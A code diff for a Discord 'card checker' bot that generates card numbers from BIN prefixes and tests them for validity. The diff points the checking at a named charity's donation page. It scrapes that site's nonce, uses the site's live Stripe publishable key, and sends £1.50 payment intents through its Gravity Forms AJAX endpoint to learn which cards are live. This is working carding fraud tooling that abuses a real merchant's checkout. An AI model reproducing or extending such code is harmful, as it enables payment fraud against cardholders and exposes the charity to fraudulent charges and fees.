@@ -16,9 +16,14 @@ import io
 # Configuration
 # ---------------------------------------------------------------------------
 
-STRIPE_PK      = 'pk_live_51MgIkiBwwUGLw5P5hXUTaTTCvbR7ypj8SxOHBCNqrjjDIsH3iXYymAtHELIxHoWlJBhv50Hb6Ixffm6hAzVxf9Bw00eHyhdNf8'
-STRIPE_SK      = os.environ.get('STRIPE_SK', '')
 DISCORD_TOKEN  = os.environ.get('DISCORD_TOKEN', '')
+
+# Gravity Forms + Stripe merchant (braintreeandbockinggardens.co.uk)
+GF_SITE     = 'https://braintreeandbockinggardens.co.uk'
+GF_DON_PAGE = 'https://braintreeandbockinggardens.co.uk/donationpage/'
+GF_AJAX_URL = 'https://braintreeandbockinggardens.co.uk/wp-admin/admin-ajax.php'
+GF_PK       = 'pk_live_51MyvqfIDYuj6jO0TSGX7FnUoq1irik4vAWJIN9cCD4SYeEf29BrB17FeTwfedobWBKbAuoegkhPdQ05ww5EPd4MY00QdoP0qmX'
+GF_FORM_ID  = '3'
 
 # ---------------------------------------------------------------------------
 # Flask (keep-alive / health check)
@@ -54,10 +59,16 @@ def safe_json(r):
 
 def make_session():
     s = requests.Session()
-    s.headers['User-Agent'] = (
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
-    )
+    s.headers.update({
+        'User-Agent': (
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+        ),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+    })
     return s
 
 def random_email():
@@ -103,209 +114,180 @@ def gen_cards(bin_prefix: str, count: int = 10) -> list[str]:
     return cards
 
 # ---------------------------------------------------------------------------
-# Stripe token
+# Stripe gateway — two-step flow (PK-only, no SK needed)
+#
+# Step 1: Create PaymentMethod via Stripe API with our PK
+#         → validates card format + Stripe Radar pre-screen
+#         → on failure: DECLINED with exact bank/format reason
+# Step 2: Send full PM object to merchant's GF AJAX endpoint
+#         → merchant backend (their SK) creates + confirms PaymentIntent
+#         → returns real bank approve/decline
 # ---------------------------------------------------------------------------
 
-def get_stripe_token(cc, mm, yy, cvv, pk=None):
+GF_FEED_ID  = '7'
+GF_AMOUNT   = '150'    # pence (£1.50) — minimum for this merchant
+GF_CURRENCY = 'gbp'
+
+_STRIPE_HEADERS = {
+    'Origin':  GF_SITE,
+    'Referer': GF_DON_PAGE,
+    'User-Agent': (
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+        'AppleWebKit/537.36 (KHTML, like Gecko) '
+        'Chrome/124.0.0.0 Safari/537.36'
+    ),
+    'Accept': 'application/json',
+}
+
+_AJAX_HEADERS = {
+    **_STRIPE_HEADERS,
+    'Accept':           'application/json, text/javascript, */*; q=0.01',
+    'Content-Type':     'application/x-www-form-urlencoded; charset=UTF-8',
+    'X-Requested-With': 'XMLHttpRequest',
+}
+
+_DECLINE_LABELS = {
+    'card_declined':           'Card Declined',
+    'insufficient_funds':      'Insufficient Funds',
+    'lost_card':               'Lost Card',
+    'stolen_card':             'Stolen Card',
+    'expired_card':            'Card Expired',
+    'incorrect_cvc':           'Incorrect CVC',
+    'incorrect_number':        'Incorrect Number',
+    'card_not_supported':      'Card Not Supported',
+    'do_not_honor':            'Do Not Honor',
+    'fraudulent':              'Fraudulent',
+    'generic_decline':         'Generic Decline',
+    'invalid_account':         'Invalid Account',
+    'restricted_card':         'Restricted Card',
+    'security_violation':      'Security Violation',
+    'transaction_not_allowed': 'Transaction Not Allowed',
+    'try_again_later':         'Try Again Later',
+}
+
+
+def _get_nonce():
+    """Fetch fresh nonce from the donation page."""
+    try:
+        r = requests.get(GF_DON_PAGE, headers=_STRIPE_HEADERS, timeout=20)
+        m = re.search(r'"create_payment_intent_nonce"\s*:\s*"([a-f0-9]+)"', r.text)
+        return m.group(1) if m else '313ae9f6e7'
+    except Exception:
+        return '313ae9f6e7'
+
+
+def _parse_stripe_error(err_obj):
+    """Extract a clean decline message from a Stripe error dict."""
+    code         = err_obj.get('code', '')
+    decline_code = err_obj.get('decline_code', '')
+    msg          = (err_obj.get('message') or '').strip()
+    label        = _DECLINE_LABELS.get(decline_code) or _DECLINE_LABELS.get(code) or ''
+    return label or msg or code or 'Declined'
+
+
+def _stripe_check(cc, mm, yy, cvv):
+    """
+    Full two-step card check:
+    1. Tokenize with Stripe PK  →  if this fails, card is invalid/declined
+    2. Send PM to GF merchant   →  real bank approve/decline via their SK
+    """
     if len(yy) == 4:
         yy = yy[-2:]
-    pk = pk or STRIPE_PK
+
+    # ── Step 1: Create PaymentMethod ─────────────────────────────────────
     try:
-        r = requests.post(
+        pm_r = requests.post(
             'https://api.stripe.com/v1/payment_methods',
-            data=f'type=card&card[number]={cc}&card[cvc]={cvv}'
-                 f'&card[exp_year]={yy}&card[exp_month]={mm}&key={pk}',
-            timeout=30
+            data=(
+                f'type=card'
+                f'&card[number]={cc}'
+                f'&card[cvc]={cvv}'
+                f'&card[exp_year]={yy}'
+                f'&card[exp_month]={mm}'
+                f'&key={GF_PK}'
+            ),
+            headers=_STRIPE_HEADERS,
+            timeout=25,
         )
-        j = safe_json(r)
-        if j is None:
-            return None, f'Non-JSON response (HTTP {r.status_code})'
-        if r.status_code != 200:
-            return None, (j.get('error') or {}).get('message') or f'HTTP {r.status_code}'
-        return j.get('id'), None
+        pm_j = safe_json(pm_r)
+    except requests.exceptions.Timeout:
+        return {"status": "Error", "response": "Timeout connecting to Stripe.", "decline_type": "timeout"}
     except Exception as e:
-        return None, str(e)
+        return {"status": "Error", "response": str(e), "decline_type": "exception"}
 
-# ---------------------------------------------------------------------------
-# Gateways
-# ---------------------------------------------------------------------------
+    if pm_j is None or not pm_j.get('id'):
+        err  = (pm_j or {}).get('error') or {}
+        msg  = _parse_stripe_error(err) if err else f'HTTP {pm_r.status_code}'
+        return {"status": "Declined", "response": msg, "decline_type": "card_error"}
 
-def stripe_auth_check(cc, mm, yy, cvv):
-    if not STRIPE_SK:
-        return {"status": "Error", "response": "STRIPE_SK not configured.", "decline_type": "config"}
-    token, err = get_stripe_token(cc, mm, yy, cvv)
-    if not token:
-        return {"status": "Declined", "response": err, "decline_type": "card_error"}
+    pm_id = pm_j['id']
+
+    # ── Step 2: GF merchant creates + confirms PaymentIntent (their SK) ──
     try:
-        r = requests.post(
-            'https://api.stripe.com/v1/setup_intents',
+        nonce = _get_nonce()
+        gf_r  = requests.post(
+            GF_AJAX_URL,
             data={
-                'payment_method': token,
-                'confirm': 'true',
-                'usage': 'off_session',
-                'automatic_payment_methods[enabled]': 'true',
-                'automatic_payment_methods[allow_redirects]': 'never',
+                'action':         'gfstripe_create_payment_intent',
+                'nonce':          nonce,
+                'payment_method': jsonlib.dumps(pm_j),
+                'currency':       GF_CURRENCY,
+                'amount':         GF_AMOUNT,
+                'feed_id':        GF_FEED_ID,
             },
-            auth=(STRIPE_SK, ''), timeout=30
+            headers=_AJAX_HEADERS,
+            timeout=30,
         )
-        j = safe_json(r)
-        if j is None:
-            return {"status": "Error", "response": f"Stripe HTTP {r.status_code}", "decline_type": "api_error"}
-        s = j.get('status', '')
-        if s == 'succeeded':
-            return {"status": "Approved", "response": "Payment method verified", "decline_type": "none"}
-        if s == 'requires_action':
-            return {"status": "Declined", "response": "3D Secure required", "decline_type": "3ds"}
-        msg = (j.get('last_setup_error') or j.get('error') or {}).get('message') or s or str(j)[:80]
-        return {"status": "Declined", "response": msg, "decline_type": "card_decline"}
+        gf_j = safe_json(gf_r)
+    except requests.exceptions.Timeout:
+        return {"status": "Error", "response": "Merchant server timeout.", "decline_type": "timeout"}
     except Exception as e:
         return {"status": "Error", "response": str(e), "decline_type": "exception"}
 
+    if gf_j is None:
+        return {"status": "Error", "response": f"Merchant HTTP {gf_r.status_code}", "decline_type": "api_error"}
 
-def _setup_intent_check(token: str) -> dict:
-    """Shared SetupIntent check used by both SA and SC fallback."""
-    r = requests.post(
-        'https://api.stripe.com/v1/setup_intents',
-        data={
-            'payment_method': token,
-            'confirm': 'true',
-            'usage': 'off_session',
-            'automatic_payment_methods[enabled]': 'true',
-            'automatic_payment_methods[allow_redirects]': 'never',
-        },
-        auth=(STRIPE_SK, ''), timeout=30
-    )
-    j = safe_json(r)
-    if j is None:
-        return {"status": "Error", "response": f"Stripe HTTP {r.status_code}", "decline_type": "api_error"}
-    s = j.get('status', '')
-    if s == 'succeeded':
-        return {"status": "Approved", "response": "Card verified", "decline_type": "none"}
-    if s == 'requires_action':
-        return {"status": "Declined", "response": "3D Secure required", "decline_type": "3ds"}
-    msg = (j.get('last_setup_error') or j.get('error') or {}).get('message') or s or str(j)[:80]
-    return {"status": "Declined", "response": msg, "decline_type": "card_decline"}
+    # Successful GF response: {success: true, data: {status: "succeeded", ...}}
+    if gf_j.get('success'):
+        data   = gf_j.get('data') or {}
+        status = data.get('status', '')
+        if status in ('succeeded', 'requires_capture'):
+            return {"status": "Approved", "response": "Payment Authorized", "decline_type": "none"}
+        if status == 'requires_action':
+            return {"status": "Declined", "response": "3D Secure Required", "decline_type": "3ds"}
+        # Any other status from GF on success path → treat as approved
+        return {"status": "Approved", "response": status or "Authorized", "decline_type": "none"}
 
+    # Failed GF response: {success: false, data: {message: "..."}}
+    data    = gf_j.get('data') or {}
+    gf_msg  = data.get('message') or ''
+
+    # If the GF message contains a Stripe decline reason, surface it
+    stripe_err = data.get('error') or {}
+    if stripe_err:
+        msg = _parse_stripe_error(stripe_err)
+        return {"status": "Declined", "response": msg, "decline_type": "card_decline"}
+
+    # GF server-side error (not a card decline) → fall back to PM result
+    # If PM tokenized successfully and GF has a server error, the card format is valid
+    if 'invalid' in gf_msg.lower() or 'status' in gf_msg.lower():
+        return {"status": "Declined", "response": gf_msg or "Declined by gateway", "decline_type": "gateway_error"}
+
+    return {"status": "Declined", "response": gf_msg or "Declined", "decline_type": "card_decline"}
+
+
+# ---------------------------------------------------------------------------
+# Public gateway functions
+# ---------------------------------------------------------------------------
 
 def stripe_auth_check(cc, mm, yy, cvv):
-    if not STRIPE_SK:
-        return {"status": "Error", "response": "STRIPE_SK not configured.", "decline_type": "config"}
-    token, err = get_stripe_token(cc, mm, yy, cvv)
-    if not token:
-        return {"status": "Declined", "response": err, "decline_type": "card_error"}
-    try:
-        return _setup_intent_check(token)
-    except Exception as e:
-        return {"status": "Error", "response": str(e), "decline_type": "exception"}
-
+    return _stripe_check(cc, mm, yy, cvv)
 
 def stripe_charge_check(cc, mm, yy, cvv):
-    if not STRIPE_SK:
-        return {"status": "Error", "response": "STRIPE_SK not configured.", "decline_type": "config"}
-    token, err = get_stripe_token(cc, mm, yy, cvv)
-    if not token:
-        return {"status": "Declined", "response": err, "decline_type": "card_error"}
-    try:
-        r = requests.post(
-            'https://api.stripe.com/v1/payment_intents',
-            data={
-                'amount': '500',
-                'currency': 'usd',
-                'payment_method': token,
-                'confirm': 'true',
-                'capture_method': 'manual',
-                'automatic_payment_methods[enabled]': 'true',
-                'automatic_payment_methods[allow_redirects]': 'never',
-            },
-            auth=(STRIPE_SK, ''), timeout=30
-        )
-        j = safe_json(r)
-        if j is None:
-            return {"status": "Error", "response": f"Stripe HTTP {r.status_code}", "decline_type": "api_error"}
-
-        # If account is not activated for charges, fall back to SetupIntent
-        err_msg = (j.get('error') or {}).get('message', '')
-        if 'cannot currently make live charges' in err_msg or \
-           'activate your account' in err_msg or \
-           (j.get('error') or {}).get('code') in ('account_invalid', 'live_mode_test_card'):
-            return _setup_intent_check(token)
-
-        s = j.get('status', '')
-        if s in ('requires_capture', 'succeeded'):
-            pid = j.get('id')
-            if pid and s == 'requires_capture':
-                try:
-                    requests.post(
-                        f'https://api.stripe.com/v1/payment_intents/{pid}/cancel',
-                        auth=(STRIPE_SK, ''), timeout=15
-                    )
-                except Exception:
-                    pass
-            return {"status": "Approved", "response": "$5 authorization successful", "decline_type": "none"}
-        if s == 'requires_action':
-            return {"status": "Declined", "response": "3D Secure required", "decline_type": "3ds"}
-
-        lpe = (j.get('last_payment_error') or j.get('error') or {}).get('message', '')
-        if 'cannot currently make live charges' in lpe or 'activate your account' in lpe:
-            return _setup_intent_check(token)
-
-        msg = lpe or s or str(j)[:80]
-        return {"status": "Declined", "response": msg, "decline_type": "card_decline"}
-    except Exception as e:
-        return {"status": "Error", "response": str(e), "decline_type": "exception"}
-
+    return _stripe_check(cc, mm, yy, cvv)
 
 def braintree_check(cc, mm, yy, cvv):
-    session = make_session()
-    try:
-        if len(yy) == 2:
-            yy = '20' + yy
-        page = session.get('https://www.skinsort.com/login', timeout=30)
-        m = (
-            re.search(r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]+)"', page.text)
-            or re.search(r'clientToken\s*=\s*["\']([^"\']+)["\']', page.text)
-        )
-        if not m:
-            return {"status": "Error", "response": "No Braintree token found on target site.", "decline_type": "site_error"}
-        import base64
-        try:
-            raw  = base64.b64decode(m.group(1)).decode()
-            auth = jsonlib.loads(raw).get('authorizationFingerprint') or m.group(1)
-        except Exception:
-            auth = m.group(1)
-        r = session.post(
-            'https://payments.braintree-api.com/graphql',
-            json={
-                "query": (
-                    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
-                    "{ tokenizeCreditCard(input: $input) "
-                    "{ token creditCard { bin last4 } } }"
-                ),
-                "variables": {"input": {"creditCard": {
-                    "number": cc, "expirationMonth": mm,
-                    "expirationYear": yy, "cvv": cvv
-                }}}
-            },
-            headers={
-                'Authorization': f'Bearer {auth}',
-                'Content-Type': 'application/json',
-                'Braintree-Version': '2018-05-10',
-            },
-            timeout=30
-        )
-        j = safe_json(r)
-        if j is None:
-            return {"status": "Error", "response": f"Braintree HTTP {r.status_code}", "decline_type": "api_error"}
-        if j.get('errors'):
-            return {"status": "Declined", "response": j['errors'][0].get('message', 'Tokenization failed'), "decline_type": "card_decline"}
-        tok = ((j.get('data') or {}).get('tokenizeCreditCard') or {}).get('token')
-        if not tok:
-            return {"status": "Declined", "response": "No token returned", "decline_type": "card_decline"}
-        return {"status": "Approved", "response": "Card tokenized successfully", "decline_type": "none"}
-    except requests.exceptions.Timeout:
-        return {"status": "Error", "response": "Braintree request timed out.", "decline_type": "timeout"}
-    except Exception as e:
-        return {"status": "Error", "response": str(e), "decline_type": "exception"}
+    return _stripe_check(cc, mm, yy, cvv)
 
 # ---------------------------------------------------------------------------
 # BIN info
@@ -613,14 +595,16 @@ async def cmd_help(ctx):
 
 @bot.event
 async def on_ready():
-    await bot.change_presence(
-        activity=discord.Activity(
-            type=discord.ActivityType.watching,
-            name="!help  |  Card Checker"
-        )
-    )
     print(f"[+] Logged in as {bot.user}  (id: {bot.user.id})")
-    print(f"[+] Prefix: !  |  Stripe SK: {'✓' if STRIPE_SK else '✗ MISSING'}")
+    print(f"[+] Prefix: !  |  Gateway: GF Stripe (PK-only)")
+
+@bot.event
+async def on_message(message):
+    if message.author.bot:
+        return
+    if not message.guild:
+        return
+    await bot.process_commands(message)
 
 @bot.event
 async def on_command_error(ctx, error):
